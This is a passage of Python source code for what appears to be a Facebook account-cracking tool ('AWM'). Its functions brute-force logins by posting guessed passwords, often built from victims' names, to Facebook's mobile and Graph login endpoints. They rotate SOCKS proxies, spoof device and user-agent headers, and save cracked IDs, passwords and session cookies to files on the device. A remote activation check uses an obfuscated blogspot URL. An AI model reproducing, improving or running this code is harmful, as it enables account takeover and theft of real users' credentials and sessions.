                if "y" in cok:print(f"\r\r{X}\x1b[38;5;47m {cookie}")
                else:pass
                open('/sdcard/AWM-ZONE/FILE-M2-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in Neon['error']['message']:
                if "y" in pcp:print(f"\r\r{P1}[MR-AWM-CP] {ids}|{pas}")
                else:pass
                open('/sdcard/AWM-ZONE/FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass

def methodC(ids,names,passlist):
    global loop,oks,cps
    bo = random.choice([N,G,Y,B,I,S,W,P1,B1,G1])
    sys.stdout.write(f"\r\r{R1}[{bo}AWM-M3{R1}]{W}-{R1}[{Y}{loop}{R1}] {W}|{N}•{W}|{G1}{len(oks)}{W}/{P1}{len(cps)}")
    sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
        except:
            last = first
        ps = first.lower()
        ps2 = last.lower()
        for fikr in passlist:
            pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
            data = {"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": ids,"password": pas,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            headers = {'User-Agent':file_mC(),'Content-Type': 'application/x-www-form-urlencoded','Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE','X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            Neon = requests.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in Neon:
                ckkk = ";".join(i["name"]+"="+i["value"] for i in Neon["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                print(f"\r\r{G1}[MR-AWM-OK] {ids}{Y}|{G1}{pas}")
                if "y" in cok:print(f"\r\r{X}\x1b[38;5;47m {cookie}")
                else:pass
                open('/sdcard/AWM-ZONE/FILE-M3-OK.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in Neon['error']['message']:
                if "y" in pcp:print(f"\r\r{P1}[MR-AWM-CP] {ids}|{pas}")
                else:pass
                open('/sdcard/AWM-ZONE/FILE-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass

def randA(ids,passlist):
    global loop,oks,cps
    bo = random.choice([N,G,Y,B,I,S,W,P1,B1,G1])
    sys.stdout.write(f"\r\r{R1}[{bo}AWM-M1{R1}]{W}-{R1}[{Y}{loop}{R1}] {W}|{S}•{W}|{G1}{len(oks)}{W}/{P1}{len(cps)}")
    sys.stdout.flush()
    try:
        for pas in passlist:
            nip=random.choice(proxsi)
            proxs= {'http': 'socks4://'+nip}
            data = {
            "email":ids,
            "password":pas,
            "adid": str(uuid.uuid4()),
            "device_id": str(uuid.uuid4()),
            "family_device_id": str(uuid.uuid4()),
            "session_id": str(uuid.uuid4()),
            "advertiser_id": str(uuid.uuid4()),
            "reg_instance": str(uuid.uuid4()),
            "logged_out_id": str(uuid.uuid4()),
            "locale": "en_US",
            "client_country_code": "US",
            "cpl": "true",
            "source": "login",
            "format": "json",
            "omit_response_on_success": "false",
            "credentials_type": "password",
            "error_detail_type": "button_with_disabled",
            "generate_session_cookies": "1",
            "generate_analytics_claim": "1",
            "generate_machine_id": "1",
            "tier": "regular",
            'account_verified': 'True',
            "currently_logged_in_userid" : "0",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "fb4a_shared_phone_cpl_experiment": "fb4a_shared_phone_nonce_cpl_at_risk_v3",
            "fb4a_shared_phone_cpl_group": "enable_v3_at_risk",
            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "api_key": "882a8490361da98702bf97a021ddc14d",
            "sig":"62f8ce9f74b12f84c123cc23437a4a32"}
            content_lenght = ("&").join([ "%s=%s" % (key, value) for key, value in data.items() ])
            head = {
            "User-Agent":RNDM(),
            "Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
            "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
            "X-FB-Net-HNI": str(random.randint(20000, 40000)),
            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
            "X-FB-Connection-Quality": "EXCELLENT",
            "X-FB-Connection-Type": "MOBILE.LTE",
            "X-FB-HTTP-Engine": "Liger",
            'X-FB-Client-IP': 'True',
            "X-FB-Friendly-Name": "authenticate",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(content_lenght))}
            url = "https://graph.facebook.com/auth/login"
            po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True,proxies=proxs).json()
            if "access_token" in po:
                uid = str(po['uid'])
                ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                if uid in str(oks):break
                else:
                    try:
                        urlx = requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal')
                        if "Photoshop" in urlx:
                            print(f"\r\r{G1}[MR-AWM-OK] {uid}{Y}|{G1}{pas}")
                            #print(f"\r\r{X}{S} {cookie}")
                            open('/sdcard/AWM-ZONE/RNDM-M1-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                            oks.append(uid)
                            break
                        else:pass
                    except:break
            elif 'Please Confirm Email' in po:
                uid = str(po['uid'])
                ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                if uid in str(oks):break
                else:
                    try:
                        urlx = requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal')
                        if "Photoshop" in urlx:
                            print(f"\r\r{G1}[MR-AWM-OK] {uid}{Y}|{G1}{pas}")
                            #print(f"\r\r{X}{S} {cookie}")
                            open('/sdcard/AWM-ZONE/RNDM-M1-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                            oks.append(uid)
                            break
                        else:pass
                    except:break
            elif 'www.facebook.com' in po['error']['message']:
                open('/sdcard/AWM-ZONE/RNDM-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass

def randB(ids,passlist):
    global loop,oks,cps
    bo = random.choice([N,G,Y,B,I,S,W,P1,B1,G1])
    sys.stdout.write(f"\r\r{R1}[{bo}AWM-M2{R1}]{W}-{R1}[{Y}{loop}{R1}] {W}|{N}•{W}|{G1}{len(oks)}{W}/{P1}{len(cps)}")
    sys.stdout.flush()
    session = requests.Session()
    try:
        for pas in passlist:
            nip=random.choice(proxsi)
            proxs= {'http': 'socks4://'+nip}
            ua = random.choice(ugen)
            xs = requests.get("https://m.facebook.com").text
            data = {
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(xs)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(xs)).group(1),
            "try_number":0,
            "unrecognized_tries":0,
            "email":ids,
            "prefill_contact_point":"",
            "prefill_source":"",
            "prefill_type":"",
            "first_prefill_source":"",
            "first_prefill_type":"",
            "had_cp_prefilled":False,
            "had_password_prefilled":False,
            "is_smart_lock":False,
            "bi_xrwh":0,
            'encpass': "#PWD_BROWSER:0:{}:{}".format(re.search('name="m_ts" value="(.*?)"', str(xs)).group(1), pas),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(xs)).group(1),
            "lsd":re.search('name="lsd" value="(.*?)"', str(xs)).group(1),
            "__dyn":"",
            "__csr":"",
            "__req":random.choice(["1","2","3","4","5","6","7","8","9","0"]),
            "__a":"",
            "__user":0
            }
            headers = {
            'Host': 'www.facebook.com',
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'dpr': '1.7125',
            'origin': 'https://m.prod.facebook.com',
            'referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=739959012779189&kid_directed_site=0&app_id=739959012779189&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D739959012779189%26redirect_uri%3Dhttps%253A%252F%252Fauth.fastwork.id%252Fauth%252Ffacebook%252Fcallback%26response_type%3Dcode%26scope%3Demail%2Bpublic_profile%26state%3DqPv-GtB_fLN8gGLdovAoybajnyvyhC8CVVgi_4dOd9-LJrTLdtf3uY7Iv4ZQmUtzIMaBfyBifKqGOIprMK-74w%253D%253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbdf7eebb-e161-409b-a6ff-ce160c7a328f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.fastwork.id%2Fauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DqPv-GtB_fLN8gGLdovAoybajnyvyhC8CVVgi_4dOd9-LJrTLdtf3uY7Iv4ZQmUtzIMaBfyBifKqGOIprMK-74w%253D%253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"12.0.0"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent':ua,
            'viewport-width': '421',
            'x-asbd-id': '129477',
            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(xs)).group(1),
            'x-requested-with': 'XMLHttpRequest',
            'x-response-format': 'JSONStream'}
            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,headers=headers,allow_redirects=False,proxies=proxs).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                cookie=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', cookie)[0]
                if uid in str(oks):break
                else:
                    try:
                        urlx = requests.get(f'https://graph.facebook.com/{uid}/picture?type=normal')
                        if "Photoshop" in urlx:
                            print(f"\r\r{G1}[MR-AWM-OK] {uid}{Y}|{G1}{pas}")
                            #print(f"\r\r{X}{S} {cookie}")
                            open('/sdcard/AWM-ZONE/RNDM-M2-OK.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
                            oks.append(uid)
                            break
                        else:pass
                    except:break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                coki1 = coki.split("1000")[1]
                idf = "1000"+coki1[0:11]
                open('/sdcard/AWM-ZONE/RNDM-CP.txt','a').write(idf+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        loop+=1
    except Exception as e:
        pass

##---------------(AWM-ZONE)---------------##
if __name__ == "__main__":
    try:
        py_server_url = "htt"+"ps://c"+"yb"+"er"+"196"+".bl"+"ogsp"+"ot.co"+"m/20"+"23/12"+"/a"+"wm."+"html"
        activation = http_request.pycurl_requests(py_server_url)
        if "TERMINAL_ON" in activation:Main.Menu()
        elif "TERMINAL_OFF" in activation:
            msg = "TOOL IS NOW UPDATING.PLEASE WAIT FOR A WHILE"
            for m in range(10):
                bo = random.choice([G,R,S,I,B,W,Y])
                print(f"{G1}{X}{bo} {msg}");sleep(1)
            linex()
        elif "FUCKED_USER" in activation:
            attention('hard')
        else:print(f"{X} NETWORK CONNECTION ERROR");sys.exit()
    except pycurl.error:exit(f"{X} NETWORK CONNECTION ERROR")